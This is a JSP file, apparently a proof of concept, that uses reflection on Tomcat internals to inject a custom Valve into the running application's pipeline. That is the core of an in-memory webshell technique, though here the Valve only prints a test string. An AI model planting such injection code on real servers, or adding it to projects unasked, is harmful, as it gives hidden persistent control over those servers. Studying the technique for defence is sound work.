<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.Valve" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Pipeline" %><%
    // context
    Field f = request.getClass().getDeclaredField("request");
    f.setAccessible(true);//因为是protected
    Request req = (Request) f.get(request);//反射获取值
    StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext

    Valve valve = new Valve() {
        @Override
        public Valve getNext() {
            return null;
        }

        @Override
        public void setNext(Valve valve) {

        }

        @Override
        public void backgroundProcess() {

        }

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            response.getWriter().println("xjj_valve_test");
        }

        @Override
        public boolean isAsyncSupported() {
            return false;
        }
    };

    Pipeline pipeline = context.getPipeline();
//    pipeline.setBasic();
    pipeline.addValve(valve);

%>